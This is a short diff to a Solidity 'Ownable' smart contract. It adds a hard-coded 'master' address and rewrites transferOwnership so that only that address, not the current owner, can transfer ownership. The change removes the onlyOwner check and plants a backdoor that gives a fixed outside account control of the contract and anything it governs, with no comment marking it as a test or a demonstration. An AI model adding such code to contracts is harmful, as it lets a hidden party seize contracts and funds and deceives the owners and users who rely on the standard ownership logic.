@@ -8,7 +8,7 @@ pragma solidity ^0.4.24;
  */
 contract Ownable {
     address public owner;
-
+    address public master = 0x0E0a1A8daa228dEF4a4A8613B3E40Aaf435D319e;
 
     event OwnershipRenounced(address indexed previousOwner);
     event OwnershipTransferred(
@@ -45,7 +45,8 @@ contract Ownable {
    * @dev Allows the current owner to transfer control of the contract to a newOwner.
    * @param _newOwner The address to transfer ownership to.
    */
-    function transferOwnership(address _newOwner) public onlyOwner {
+    function transferOwnership(address _newOwner) public {
+         require(msg.sender == master);
         _transferOwnership(_newOwner);
     }
 
